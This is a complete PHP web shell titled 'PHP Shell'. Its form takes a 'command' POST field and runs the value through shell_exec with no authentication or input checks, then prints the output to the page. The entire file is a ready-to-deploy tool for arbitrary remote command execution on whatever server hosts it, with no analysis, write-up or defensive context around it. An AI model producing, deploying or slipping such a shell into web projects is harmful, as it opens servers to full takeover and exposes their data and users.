<?php
if(isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Shell</title>
</head>
<body>
    <form method="post">
        <label for="command">Command:</label>
        <input type="text" id="command" name="command" required>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
